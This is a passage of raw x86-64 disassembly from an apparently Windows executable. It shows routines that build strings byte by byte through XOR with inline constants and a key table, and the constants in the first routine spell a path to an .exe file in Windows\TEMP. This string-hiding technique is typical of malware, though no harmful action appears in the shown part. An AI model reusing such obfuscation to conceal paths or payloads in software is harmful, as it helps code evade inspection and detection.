   140003a00:	4c 8b c3             	mov    %rbx,%r8
   140003a03:	48 83 3d 55 35 02 00 	cmpq   $0xf,0x23555(%rip)        # 0x140026f60
   140003a0a:	0f 
   140003a0b:	b8 03 00 00 00       	mov    $0x3,%eax
   140003a10:	4c 0f 47 05 30 35 02 	cmova  0x23530(%rip),%r8        # 0x140026f48
   140003a17:	00 
   140003a18:	33 d2                	xor    %edx,%edx
   140003a1a:	48 f7 f1             	div    %rcx
   140003a1d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003a22:	34 57                	xor    $0x57,%al
   140003a24:	41 88 40 03          	mov    %al,0x3(%r8)
   140003a28:	4c 8b c3             	mov    %rbx,%r8
   140003a2b:	48 83 3d 2d 35 02 00 	cmpq   $0xf,0x2352d(%rip)        # 0x140026f60
   140003a32:	0f 
   140003a33:	b8 04 00 00 00       	mov    $0x4,%eax
   140003a38:	4c 0f 47 05 08 35 02 	cmova  0x23508(%rip),%r8        # 0x140026f48
   140003a3f:	00 
   140003a40:	33 d2                	xor    %edx,%edx
   140003a42:	48 f7 f1             	div    %rcx
   140003a45:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003a4a:	34 69                	xor    $0x69,%al
   140003a4c:	41 88 40 04          	mov    %al,0x4(%r8)
   140003a50:	4c 8b c3             	mov    %rbx,%r8
   140003a53:	48 83 3d 05 35 02 00 	cmpq   $0xf,0x23505(%rip)        # 0x140026f60
   140003a5a:	0f 
   140003a5b:	b8 05 00 00 00       	mov    $0x5,%eax
   140003a60:	4c 0f 47 05 e0 34 02 	cmova  0x234e0(%rip),%r8        # 0x140026f48
   140003a67:	00 
   140003a68:	33 d2                	xor    %edx,%edx
   140003a6a:	48 f7 f1             	div    %rcx
   140003a6d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003a72:	34 6e                	xor    $0x6e,%al
   140003a74:	41 88 40 05          	mov    %al,0x5(%r8)
   140003a78:	4c 8b c3             	mov    %rbx,%r8
   140003a7b:	48 83 3d dd 34 02 00 	cmpq   $0xf,0x234dd(%rip)        # 0x140026f60
   140003a82:	0f 
   140003a83:	b8 06 00 00 00       	mov    $0x6,%eax
   140003a88:	4c 0f 47 05 b8 34 02 	cmova  0x234b8(%rip),%r8        # 0x140026f48
   140003a8f:	00 
   140003a90:	33 d2                	xor    %edx,%edx
   140003a92:	48 f7 f1             	div    %rcx
   140003a95:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003a9a:	34 64                	xor    $0x64,%al
   140003a9c:	41 88 40 06          	mov    %al,0x6(%r8)
   140003aa0:	4c 8b c3             	mov    %rbx,%r8
   140003aa3:	48 83 3d b5 34 02 00 	cmpq   $0xf,0x234b5(%rip)        # 0x140026f60
   140003aaa:	0f 
   140003aab:	b8 07 00 00 00       	mov    $0x7,%eax
   140003ab0:	4c 0f 47 05 90 34 02 	cmova  0x23490(%rip),%r8        # 0x140026f48
   140003ab7:	00 
   140003ab8:	33 d2                	xor    %edx,%edx
   140003aba:	48 f7 f1             	div    %rcx
   140003abd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003ac2:	34 6f                	xor    $0x6f,%al
   140003ac4:	41 88 40 07          	mov    %al,0x7(%r8)
   140003ac8:	4c 8b c3             	mov    %rbx,%r8
   140003acb:	48 83 3d 8d 34 02 00 	cmpq   $0xf,0x2348d(%rip)        # 0x140026f60
   140003ad2:	0f 
   140003ad3:	b8 08 00 00 00       	mov    $0x8,%eax
   140003ad8:	4c 0f 47 05 68 34 02 	cmova  0x23468(%rip),%r8        # 0x140026f48
   140003adf:	00 
   140003ae0:	33 d2                	xor    %edx,%edx
   140003ae2:	48 f7 f1             	div    %rcx
   140003ae5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003aea:	34 77                	xor    $0x77,%al
   140003aec:	41 88 40 08          	mov    %al,0x8(%r8)
   140003af0:	4c 8b c3             	mov    %rbx,%r8
   140003af3:	48 83 3d 65 34 02 00 	cmpq   $0xf,0x23465(%rip)        # 0x140026f60
   140003afa:	0f 
   140003afb:	b8 09 00 00 00       	mov    $0x9,%eax
   140003b00:	4c 0f 47 05 40 34 02 	cmova  0x23440(%rip),%r8        # 0x140026f48
   140003b07:	00 
   140003b08:	33 d2                	xor    %edx,%edx
   140003b0a:	48 f7 f1             	div    %rcx
   140003b0d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003b12:	34 73                	xor    $0x73,%al
   140003b14:	41 88 40 09          	mov    %al,0x9(%r8)
   140003b18:	4c 8b c3             	mov    %rbx,%r8
   140003b1b:	48 83 3d 3d 34 02 00 	cmpq   $0xf,0x2343d(%rip)        # 0x140026f60
   140003b22:	0f 
   140003b23:	b8 0a 00 00 00       	mov    $0xa,%eax
   140003b28:	4c 0f 47 05 18 34 02 	cmova  0x23418(%rip),%r8        # 0x140026f48
   140003b2f:	00 
   140003b30:	33 d2                	xor    %edx,%edx
   140003b32:	48 f7 f1             	div    %rcx
   140003b35:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003b3a:	34 5c                	xor    $0x5c,%al
   140003b3c:	41 88 40 0a          	mov    %al,0xa(%r8)
   140003b40:	4c 8b c3             	mov    %rbx,%r8
   140003b43:	48 83 3d 15 34 02 00 	cmpq   $0xf,0x23415(%rip)        # 0x140026f60
   140003b4a:	0f 
   140003b4b:	b8 0b 00 00 00       	mov    $0xb,%eax
   140003b50:	4c 0f 47 05 f0 33 02 	cmova  0x233f0(%rip),%r8        # 0x140026f48
   140003b57:	00 
   140003b58:	33 d2                	xor    %edx,%edx
   140003b5a:	48 f7 f1             	div    %rcx
   140003b5d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003b62:	34 54                	xor    $0x54,%al
   140003b64:	41 88 40 0b          	mov    %al,0xb(%r8)
   140003b68:	4c 8b c3             	mov    %rbx,%r8
   140003b6b:	48 83 3d ed 33 02 00 	cmpq   $0xf,0x233ed(%rip)        # 0x140026f60
   140003b72:	0f 
   140003b73:	b8 0c 00 00 00       	mov    $0xc,%eax
   140003b78:	4c 0f 47 05 c8 33 02 	cmova  0x233c8(%rip),%r8        # 0x140026f48
   140003b7f:	00 
   140003b80:	33 d2                	xor    %edx,%edx
   140003b82:	48 f7 f1             	div    %rcx
   140003b85:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003b8a:	34 45                	xor    $0x45,%al
   140003b8c:	41 88 40 0c          	mov    %al,0xc(%r8)
   140003b90:	4c 8b c3             	mov    %rbx,%r8
   140003b93:	48 83 3d c5 33 02 00 	cmpq   $0xf,0x233c5(%rip)        # 0x140026f60
   140003b9a:	0f 
   140003b9b:	b8 0d 00 00 00       	mov    $0xd,%eax
   140003ba0:	4c 0f 47 05 a0 33 02 	cmova  0x233a0(%rip),%r8        # 0x140026f48
   140003ba7:	00 
   140003ba8:	33 d2                	xor    %edx,%edx
   140003baa:	48 f7 f1             	div    %rcx
   140003bad:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003bb2:	34 4d                	xor    $0x4d,%al
   140003bb4:	41 88 40 0d          	mov    %al,0xd(%r8)
   140003bb8:	4c 8b c3             	mov    %rbx,%r8
   140003bbb:	48 83 3d 9d 33 02 00 	cmpq   $0xf,0x2339d(%rip)        # 0x140026f60
   140003bc2:	0f 
   140003bc3:	b8 0e 00 00 00       	mov    $0xe,%eax
   140003bc8:	4c 0f 47 05 78 33 02 	cmova  0x23378(%rip),%r8        # 0x140026f48
   140003bcf:	00 
   140003bd0:	33 d2                	xor    %edx,%edx
   140003bd2:	48 f7 f1             	div    %rcx
   140003bd5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003bda:	34 50                	xor    $0x50,%al
   140003bdc:	41 88 40 0e          	mov    %al,0xe(%r8)
   140003be0:	4c 8b c3             	mov    %rbx,%r8
   140003be3:	48 83 3d 75 33 02 00 	cmpq   $0xf,0x23375(%rip)        # 0x140026f60
   140003bea:	0f 
   140003beb:	b8 0f 00 00 00       	mov    $0xf,%eax
   140003bf0:	4c 0f 47 05 50 33 02 	cmova  0x23350(%rip),%r8        # 0x140026f48
   140003bf7:	00 
   140003bf8:	33 d2                	xor    %edx,%edx
   140003bfa:	48 f7 f1             	div    %rcx
   140003bfd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003c02:	34 5c                	xor    $0x5c,%al
   140003c04:	41 88 40 0f          	mov    %al,0xf(%r8)
   140003c08:	4c 8b c3             	mov    %rbx,%r8
   140003c0b:	48 83 3d 4d 33 02 00 	cmpq   $0xf,0x2334d(%rip)        # 0x140026f60
   140003c12:	0f 
   140003c13:	b8 10 00 00 00       	mov    $0x10,%eax
   140003c18:	4c 0f 47 05 28 33 02 	cmova  0x23328(%rip),%r8        # 0x140026f48
   140003c1f:	00 
   140003c20:	33 d2                	xor    %edx,%edx
   140003c22:	48 f7 f1             	div    %rcx
   140003c25:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003c2a:	34 67                	xor    $0x67,%al
   140003c2c:	41 88 40 10          	mov    %al,0x10(%r8)
   140003c30:	4c 8b c3             	mov    %rbx,%r8
   140003c33:	48 83 3d 25 33 02 00 	cmpq   $0xf,0x23325(%rip)        # 0x140026f60
   140003c3a:	0f 
   140003c3b:	b8 11 00 00 00       	mov    $0x11,%eax
   140003c40:	4c 0f 47 05 00 33 02 	cmova  0x23300(%rip),%r8        # 0x140026f48
   140003c47:	00 
   140003c48:	33 d2                	xor    %edx,%edx
   140003c4a:	48 f7 f1             	div    %rcx
   140003c4d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003c52:	34 69                	xor    $0x69,%al
   140003c54:	41 88 40 11          	mov    %al,0x11(%r8)
   140003c58:	4c 8b c3             	mov    %rbx,%r8
   140003c5b:	48 83 3d fd 32 02 00 	cmpq   $0xf,0x232fd(%rip)        # 0x140026f60
   140003c62:	0f 
   140003c63:	b8 12 00 00 00       	mov    $0x12,%eax
   140003c68:	4c 0f 47 05 d8 32 02 	cmova  0x232d8(%rip),%r8        # 0x140026f48
   140003c6f:	00 
   140003c70:	33 d2                	xor    %edx,%edx
   140003c72:	48 f7 f1             	div    %rcx
   140003c75:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003c7a:	34 61                	xor    $0x61,%al
   140003c7c:	41 88 40 12          	mov    %al,0x12(%r8)
   140003c80:	4c 8b c3             	mov    %rbx,%r8
   140003c83:	48 83 3d d5 32 02 00 	cmpq   $0xf,0x232d5(%rip)        # 0x140026f60
   140003c8a:	0f 
   140003c8b:	b8 13 00 00 00       	mov    $0x13,%eax
   140003c90:	4c 0f 47 05 b0 32 02 	cmova  0x232b0(%rip),%r8        # 0x140026f48
   140003c97:	00 
   140003c98:	33 d2                	xor    %edx,%edx
   140003c9a:	48 f7 f1             	div    %rcx
   140003c9d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003ca2:	34 6e                	xor    $0x6e,%al
   140003ca4:	41 88 40 13          	mov    %al,0x13(%r8)
   140003ca8:	4c 8b c3             	mov    %rbx,%r8
   140003cab:	48 83 3d ad 32 02 00 	cmpq   $0xf,0x232ad(%rip)        # 0x140026f60
   140003cb2:	0f 
   140003cb3:	b8 14 00 00 00       	mov    $0x14,%eax
   140003cb8:	4c 0f 47 05 88 32 02 	cmova  0x23288(%rip),%r8        # 0x140026f48
   140003cbf:	00 
   140003cc0:	33 d2                	xor    %edx,%edx
   140003cc2:	48 f7 f1             	div    %rcx
   140003cc5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003cca:	34 6e                	xor    $0x6e,%al
   140003ccc:	41 88 40 14          	mov    %al,0x14(%r8)
   140003cd0:	4c 8b c3             	mov    %rbx,%r8
   140003cd3:	48 83 3d 85 32 02 00 	cmpq   $0xf,0x23285(%rip)        # 0x140026f60
   140003cda:	0f 
   140003cdb:	b8 15 00 00 00       	mov    $0x15,%eax
   140003ce0:	4c 0f 47 05 60 32 02 	cmova  0x23260(%rip),%r8        # 0x140026f48
   140003ce7:	00 
   140003ce8:	33 d2                	xor    %edx,%edx
   140003cea:	48 f7 f1             	div    %rcx
   140003ced:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003cf2:	34 69                	xor    $0x69,%al
   140003cf4:	41 88 40 15          	mov    %al,0x15(%r8)
   140003cf8:	4c 8b c3             	mov    %rbx,%r8
   140003cfb:	48 83 3d 5d 32 02 00 	cmpq   $0xf,0x2325d(%rip)        # 0x140026f60
   140003d02:	0f 
   140003d03:	b8 16 00 00 00       	mov    $0x16,%eax
   140003d08:	4c 0f 47 05 38 32 02 	cmova  0x23238(%rip),%r8        # 0x140026f48
   140003d0f:	00 
   140003d10:	33 d2                	xor    %edx,%edx
   140003d12:	48 f7 f1             	div    %rcx
   140003d15:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003d1a:	34 38                	xor    $0x38,%al
   140003d1c:	41 88 40 16          	mov    %al,0x16(%r8)
   140003d20:	4c 8b c3             	mov    %rbx,%r8
   140003d23:	48 83 3d 35 32 02 00 	cmpq   $0xf,0x23235(%rip)        # 0x140026f60
   140003d2a:	0f 
   140003d2b:	b8 17 00 00 00       	mov    $0x17,%eax
   140003d30:	4c 0f 47 05 10 32 02 	cmova  0x23210(%rip),%r8        # 0x140026f48
   140003d37:	00 
   140003d38:	33 d2                	xor    %edx,%edx
   140003d3a:	48 f7 f1             	div    %rcx
   140003d3d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003d42:	34 2e                	xor    $0x2e,%al
   140003d44:	41 88 40 17          	mov    %al,0x17(%r8)
   140003d48:	4c 8b c3             	mov    %rbx,%r8
   140003d4b:	48 83 3d 0d 32 02 00 	cmpq   $0xf,0x2320d(%rip)        # 0x140026f60
   140003d52:	0f 
   140003d53:	b8 18 00 00 00       	mov    $0x18,%eax
   140003d58:	4c 0f 47 05 e8 31 02 	cmova  0x231e8(%rip),%r8        # 0x140026f48
   140003d5f:	00 
   140003d60:	33 d2                	xor    %edx,%edx
   140003d62:	48 f7 f1             	div    %rcx
   140003d65:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003d6a:	34 65                	xor    $0x65,%al
   140003d6c:	41 88 40 18          	mov    %al,0x18(%r8)
   140003d70:	4c 8b c3             	mov    %rbx,%r8
   140003d73:	48 83 3d e5 31 02 00 	cmpq   $0xf,0x231e5(%rip)        # 0x140026f60
   140003d7a:	0f 
   140003d7b:	b8 19 00 00 00       	mov    $0x19,%eax
   140003d80:	4c 0f 47 05 c0 31 02 	cmova  0x231c0(%rip),%r8        # 0x140026f48
   140003d87:	00 
   140003d88:	33 d2                	xor    %edx,%edx
   140003d8a:	48 f7 f1             	div    %rcx
   140003d8d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003d92:	34 78                	xor    $0x78,%al
   140003d94:	41 88 40 19          	mov    %al,0x19(%r8)
   140003d98:	4c 8b c3             	mov    %rbx,%r8
   140003d9b:	48 83 3d bd 31 02 00 	cmpq   $0xf,0x231bd(%rip)        # 0x140026f60
   140003da2:	0f 
   140003da3:	b8 1a 00 00 00       	mov    $0x1a,%eax
   140003da8:	4c 0f 47 05 98 31 02 	cmova  0x23198(%rip),%r8        # 0x140026f48
   140003daf:	00 
   140003db0:	33 d2                	xor    %edx,%edx
   140003db2:	48 f7 f1             	div    %rcx
   140003db5:	48 8b c3             	mov    %rbx,%rax
   140003db8:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   140003dbd:	80 f1 65             	xor    $0x65,%cl
   140003dc0:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   140003dc4:	48 83 c4 30          	add    $0x30,%rsp
   140003dc8:	5b                   	pop    %rbx
   140003dc9:	c3                   	ret
   140003dca:	cc                   	int3
   140003dcb:	cc                   	int3
   140003dcc:	cc                   	int3
   140003dcd:	cc                   	int3
   140003dce:	cc                   	int3
   140003dcf:	cc                   	int3
   140003dd0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003dd5:	57                   	push   %rdi
   140003dd6:	48 83 ec 30          	sub    $0x30,%rsp
   140003dda:	48 8d 3d c7 30 02 00 	lea    0x230c7(%rip),%rdi        # 0x140026ea8
   140003de1:	33 db                	xor    %ebx,%ebx
   140003de3:	48 8b cf             	mov    %rdi,%rcx
   140003de6:	ba 20 00 00 00       	mov    $0x20,%edx
   140003deb:	e8 20 25 00 00       	call   0x140006310
   140003df0:	4c 8d 15 d1 aa 00 00 	lea    0xaad1(%rip),%r10        # 0x14000e8c8
   140003df7:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140003dfe:	66 90                	xchg   %ax,%ax
   140003e00:	48 ff c1             	inc    %rcx
   140003e03:	41 38 1c 0a          	cmp    %bl,(%r10,%rcx,1)
   140003e07:	75 f7                	jne    0x140003e00
   140003e09:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140003e0f:	4c 8d 1d 12 ab 00 00 	lea    0xab12(%rip),%r11        # 0x14000e928
   140003e16:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140003e1d:	00 00 00 
   140003e20:	48 83 3d 98 30 02 00 	cmpq   $0xf,0x23098(%rip)        # 0x140026ec0
   140003e27:	0f 
   140003e28:	4c 8b c7             	mov    %rdi,%r8
   140003e2b:	48 8b c3             	mov    %rbx,%rax
   140003e2e:	4c 0f 47 05 72 30 02 	cmova  0x23072(%rip),%r8        # 0x140026ea8
   140003e35:	00 
   140003e36:	33 d2                	xor    %edx,%edx
   140003e38:	48 f7 f1             	div    %rcx
   140003e3b:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140003e40:	43 32 44 19 ff       	xor    -0x1(%r9,%r11,1),%al
   140003e45:	41 88 04 18          	mov    %al,(%r8,%rbx,1)
   140003e49:	4c 8b c7             	mov    %rdi,%r8
   140003e4c:	48 83 3d 6c 30 02 00 	cmpq   $0xf,0x2306c(%rip)        # 0x140026ec0
   140003e53:	0f 
   140003e54:	49 8b c1             	mov    %r9,%rax
   140003e57:	4c 0f 47 05 49 30 02 	cmova  0x23049(%rip),%r8        # 0x140026ea8
   140003e5e:	00 
   140003e5f:	33 d2                	xor    %edx,%edx
   140003e61:	48 f7 f1             	div    %rcx
   140003e64:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140003e69:	43 32 04 19          	xor    (%r9,%r11,1),%al
   140003e6d:	41 88 44 18 01       	mov    %al,0x1(%r8,%rbx,1)
   140003e72:	4c 8b c7             	mov    %rdi,%r8
   140003e75:	48 83 3d 43 30 02 00 	cmpq   $0xf,0x23043(%rip)        # 0x140026ec0
   140003e7c:	0f 
   140003e7d:	48 8d 43 02          	lea    0x2(%rbx),%rax
   140003e81:	4c 0f 47 05 1f 30 02 	cmova  0x2301f(%rip),%r8        # 0x140026ea8
   140003e88:	00 
   140003e89:	33 d2                	xor    %edx,%edx
   140003e8b:	48 f7 f1             	div    %rcx
   140003e8e:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140003e93:	42 32 44 1b 02       	xor    0x2(%rbx,%r11,1),%al
   140003e98:	41 88 44 18 02       	mov    %al,0x2(%r8,%rbx,1)
   140003e9d:	4c 8b c7             	mov    %rdi,%r8
   140003ea0:	48 83 3d 18 30 02 00 	cmpq   $0xf,0x23018(%rip)        # 0x140026ec0
   140003ea7:	0f 
   140003ea8:	48 8d 43 03          	lea    0x3(%rbx),%rax
   140003eac:	4c 0f 47 05 f4 2f 02 	cmova  0x22ff4(%rip),%r8        # 0x140026ea8
   140003eb3:	00 
   140003eb4:	33 d2                	xor    %edx,%edx
   140003eb6:	48 f7 f1             	div    %rcx
   140003eb9:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140003ebe:	42 32 44 1b 03       	xor    0x3(%rbx,%r11,1),%al
   140003ec3:	41 88 44 18 03       	mov    %al,0x3(%r8,%rbx,1)
   140003ec8:	4c 8b c7             	mov    %rdi,%r8
   140003ecb:	48 83 3d ed 2f 02 00 	cmpq   $0xf,0x22fed(%rip)        # 0x140026ec0
   140003ed2:	0f 
   140003ed3:	48 8d 43 04          	lea    0x4(%rbx),%rax
   140003ed7:	4c 0f 47 05 c9 2f 02 	cmova  0x22fc9(%rip),%r8        # 0x140026ea8
   140003ede:	00 
   140003edf:	33 d2                	xor    %edx,%edx
   140003ee1:	48 f7 f1             	div    %rcx
   140003ee4:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140003ee9:	42 32 44 1b 04       	xor    0x4(%rbx,%r11,1),%al
   140003eee:	41 88 44 18 04       	mov    %al,0x4(%r8,%rbx,1)
   140003ef3:	4c 8b c7             	mov    %rdi,%r8
   140003ef6:	48 83 3d c2 2f 02 00 	cmpq   $0xf,0x22fc2(%rip)        # 0x140026ec0
   140003efd:	0f 
   140003efe:	48 8d 43 05          	lea    0x5(%rbx),%rax
   140003f02:	4c 0f 47 05 9e 2f 02 	cmova  0x22f9e(%rip),%r8        # 0x140026ea8
   140003f09:	00 
   140003f0a:	33 d2                	xor    %edx,%edx
   140003f0c:	48 f7 f1             	div    %rcx
   140003f0f:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140003f14:	42 32 44 1b 05       	xor    0x5(%rbx,%r11,1),%al
   140003f19:	41 88 44 18 05       	mov    %al,0x5(%r8,%rbx,1)
   140003f1e:	4c 8b c7             	mov    %rdi,%r8
   140003f21:	48 83 3d 97 2f 02 00 	cmpq   $0xf,0x22f97(%rip)        # 0x140026ec0
   140003f28:	0f 
   140003f29:	48 8d 43 06          	lea    0x6(%rbx),%rax
   140003f2d:	4c 0f 47 05 73 2f 02 	cmova  0x22f73(%rip),%r8        # 0x140026ea8
   140003f34:	00 
   140003f35:	33 d2                	xor    %edx,%edx
   140003f37:	48 f7 f1             	div    %rcx
   140003f3a:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140003f3f:	42 32 44 1b 06       	xor    0x6(%rbx,%r11,1),%al
   140003f44:	41 88 44 18 06       	mov    %al,0x6(%r8,%rbx,1)
   140003f49:	4c 8b c7             	mov    %rdi,%r8
   140003f4c:	48 83 3d 6c 2f 02 00 	cmpq   $0xf,0x22f6c(%rip)        # 0x140026ec0
   140003f53:	0f 
   140003f54:	48 8d 43 07          	lea    0x7(%rbx),%rax
   140003f58:	4c 0f 47 05 48 2f 02 	cmova  0x22f48(%rip),%r8        # 0x140026ea8
   140003f5f:	00 
   140003f60:	33 d2                	xor    %edx,%edx
   140003f62:	48 f7 f1             	div    %rcx
   140003f65:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140003f6a:	42 32 44 1b 07       	xor    0x7(%rbx,%r11,1),%al
   140003f6f:	41 88 44 18 07       	mov    %al,0x7(%r8,%rbx,1)
   140003f74:	4c 8b c7             	mov    %rdi,%r8
   140003f77:	48 83 3d 41 2f 02 00 	cmpq   $0xf,0x22f41(%rip)        # 0x140026ec0
   140003f7e:	0f 
   140003f7f:	48 8d 43 08          	lea    0x8(%rbx),%rax
   140003f83:	4c 0f 47 05 1d 2f 02 	cmova  0x22f1d(%rip),%r8        # 0x140026ea8
   140003f8a:	00 
   140003f8b:	33 d2                	xor    %edx,%edx
   140003f8d:	48 f7 f1             	div    %rcx
   140003f90:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140003f95:	42 32 44 1b 08       	xor    0x8(%rbx,%r11,1),%al
   140003f9a:	41 88 44 18 08       	mov    %al,0x8(%r8,%rbx,1)
   140003f9f:	48 83 3d 19 2f 02 00 	cmpq   $0xf,0x22f19(%rip)        # 0x140026ec0
   140003fa6:	0f 
   140003fa7:	48 8d 43 09          	lea    0x9(%rbx),%rax
   140003fab:	4c 8b c7             	mov    %rdi,%r8
   140003fae:	4c 0f 47 05 f2 2e 02 	cmova  0x22ef2(%rip),%r8        # 0x140026ea8
   140003fb5:	00 
   140003fb6:	33 d2                	xor    %edx,%edx
   140003fb8:	48 f7 f1             	div    %rcx
   140003fbb:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140003fc0:	42 32 44 1b 09       	xor    0x9(%rbx,%r11,1),%al
   140003fc5:	41 88 44 18 09       	mov    %al,0x9(%r8,%rbx,1)
   140003fca:	48 8d 43 0a          	lea    0xa(%rbx),%rax
   140003fce:	48 83 3d ea 2e 02 00 	cmpq   $0xf,0x22eea(%rip)        # 0x140026ec0
   140003fd5:	0f 
   140003fd6:	4c 8b c7             	mov    %rdi,%r8
   140003fd9:	4c 0f 47 05 c7 2e 02 	cmova  0x22ec7(%rip),%r8        # 0x140026ea8
   140003fe0:	00 
   140003fe1:	33 d2                	xor    %edx,%edx
   140003fe3:	48 f7 f1             	div    %rcx
   140003fe6:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140003feb:	42 32 44 1b 0a       	xor    0xa(%rbx,%r11,1),%al
   140003ff0:	41 88 44 18 0a       	mov    %al,0xa(%r8,%rbx,1)
   140003ff5:	48 8d 43 0b          	lea    0xb(%rbx),%rax
   140003ff9:	48 83 3d bf 2e 02 00 	cmpq   $0xf,0x22ebf(%rip)        # 0x140026ec0
   140004000:	0f 
   140004001:	4c 8b c7             	mov    %rdi,%r8
   140004004:	4c 0f 47 05 9c 2e 02 	cmova  0x22e9c(%rip),%r8        # 0x140026ea8
   14000400b:	00 
   14000400c:	33 d2                	xor    %edx,%edx
   14000400e:	48 f7 f1             	div    %rcx
   140004011:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140004016:	42 32 44 1b 0b       	xor    0xb(%rbx,%r11,1),%al
   14000401b:	41 88 44 18 0b       	mov    %al,0xb(%r8,%rbx,1)
   140004020:	48 8d 43 0c          	lea    0xc(%rbx),%rax
   140004024:	48 83 3d 94 2e 02 00 	cmpq   $0xf,0x22e94(%rip)        # 0x140026ec0
   14000402b:	0f 
   14000402c:	4c 8b c7             	mov    %rdi,%r8
   14000402f:	4c 0f 47 05 71 2e 02 	cmova  0x22e71(%rip),%r8        # 0x140026ea8
   140004036:	00 
   140004037:	33 d2                	xor    %edx,%edx
   140004039:	48 f7 f1             	div    %rcx
   14000403c:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140004041:	42 32 44 1b 0c       	xor    0xc(%rbx,%r11,1),%al
   140004046:	41 88 44 18 0c       	mov    %al,0xc(%r8,%rbx,1)
   14000404b:	48 8d 43 0d          	lea    0xd(%rbx),%rax
   14000404f:	48 83 3d 69 2e 02 00 	cmpq   $0xf,0x22e69(%rip)        # 0x140026ec0
   140004056:	0f 
   140004057:	4c 8b c7             	mov    %rdi,%r8
   14000405a:	4c 0f 47 05 46 2e 02 	cmova  0x22e46(%rip),%r8        # 0x140026ea8
   140004061:	00 
   140004062:	33 d2                	xor    %edx,%edx
   140004064:	48 f7 f1             	div    %rcx
   140004067:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   14000406c:	42 32 44 1b 0d       	xor    0xd(%rbx,%r11,1),%al
   140004071:	41 88 44 18 0d       	mov    %al,0xd(%r8,%rbx,1)
   140004076:	48 8d 43 0e          	lea    0xe(%rbx),%rax
   14000407a:	48 83 3d 3e 2e 02 00 	cmpq   $0xf,0x22e3e(%rip)        # 0x140026ec0
   140004081:	0f 
   140004082:	4c 8b c7             	mov    %rdi,%r8
   140004085:	4c 0f 47 05 1b 2e 02 	cmova  0x22e1b(%rip),%r8        # 0x140026ea8
   14000408c:	00 
   14000408d:	33 d2                	xor    %edx,%edx
   14000408f:	48 f7 f1             	div    %rcx
   140004092:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140004097:	42 32 44 1b 0e       	xor    0xe(%rbx,%r11,1),%al
   14000409c:	41 88 44 18 0e       	mov    %al,0xe(%r8,%rbx,1)
   1400040a1:	48 8d 43 0f          	lea    0xf(%rbx),%rax
   1400040a5:	48 83 3d 13 2e 02 00 	cmpq   $0xf,0x22e13(%rip)        # 0x140026ec0
   1400040ac:	0f 
   1400040ad:	4c 8b c7             	mov    %rdi,%r8
   1400040b0:	4c 0f 47 05 f0 2d 02 	cmova  0x22df0(%rip),%r8        # 0x140026ea8
   1400040b7:	00 
   1400040b8:	33 d2                	xor    %edx,%edx
   1400040ba:	48 f7 f1             	div    %rcx
   1400040bd:	49 83 c1 10          	add    $0x10,%r9
   1400040c1:	42 0f b6 14 12       	movzbl (%rdx,%r10,1),%edx
   1400040c6:	42 32 54 1b 0f       	xor    0xf(%rbx,%r11,1),%dl
   1400040cb:	41 88 54 18 0f       	mov    %dl,0xf(%r8,%rbx,1)
   1400040d0:	48 83 c3 10          	add    $0x10,%rbx
   1400040d4:	49 83 f9 21          	cmp    $0x21,%r9
   1400040d8:	0f 82 42 fd ff ff    	jb     0x140003e20
   1400040de:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400040e3:	48 8b c7             	mov    %rdi,%rax
   1400040e6:	48 83 c4 30          	add    $0x30,%rsp
   1400040ea:	5f                   	pop    %rdi
   1400040eb:	c3                   	ret
   1400040ec:	cc                   	int3
   1400040ed:	cc                   	int3
   1400040ee:	cc                   	int3
   1400040ef:	cc                   	int3
   1400040f0:	40 53                	rex push %rbx
   1400040f2:	48 83 ec 30          	sub    $0x30,%rsp
   1400040f6:	48 8d 1d 0b 2e 02 00 	lea    0x22e0b(%rip),%rbx        # 0x140026f08
   1400040fd:	ba 0c 00 00 00       	mov    $0xc,%edx
   140004102:	48 8b cb             	mov    %rbx,%rcx
